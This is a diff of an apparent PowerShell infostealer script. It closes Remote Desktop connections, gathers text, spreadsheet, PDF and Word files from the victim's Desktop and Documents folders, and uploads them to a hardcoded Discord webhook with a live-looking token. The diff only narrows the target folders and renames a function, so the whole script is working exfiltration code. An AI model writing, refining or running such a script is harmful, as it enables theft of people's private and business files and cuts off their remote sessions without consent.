@@ -53,21 +53,15 @@ function Upload-FileToDiscord {
     }
 }
 
-# Function to get files by extension in rotation from user directories
-function Get-FilesInUserDirectories {
+# Function to get files by extension in rotation from Desktop and Documents directories
+function Get-FilesFromUserDirectories {
     param (
         [array]$extensions
     )
 
     $userFolders = @(
-        [System.Environment]::GetFolderPath("MyDocuments"),
         [System.Environment]::GetFolderPath("Desktop"),
-        [System.Environment]::GetFolderPath("Favorites"),
-        [System.Environment]::GetFolderPath("Personal"),
-        [System.Environment]::GetFolderPath("Profile"),
-        [System.Environment]::GetFolderPath("MyMusic"),
-        [System.Environment]::GetFolderPath("MyPictures"),
-        [System.Environment]::GetFolderPath("MyVideos")
+        [System.Environment]::GetFolderPath("MyDocuments")
     )
 
     $files = @()
@@ -90,12 +84,12 @@ function Close-AllWindows {
 # Close any active Remote Desktop connections
 Close-RemoteDesktopConnections
 
-# Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from user folders
+# Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from Desktop and Documents directories
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 $extensions = @("txt", "xlsx", "pdf", "doc", "docx")
 $startTime = Get-Date
 
-$files = Get-FilesInUserDirectories -extensions $extensions
+$files = Get-FilesFromUserDirectories -extensions $extensions
 foreach ($file in $files) {
     $currentTime = Get-Date
     if (($currentTime - $startTime).TotalSeconds -gt 30) {
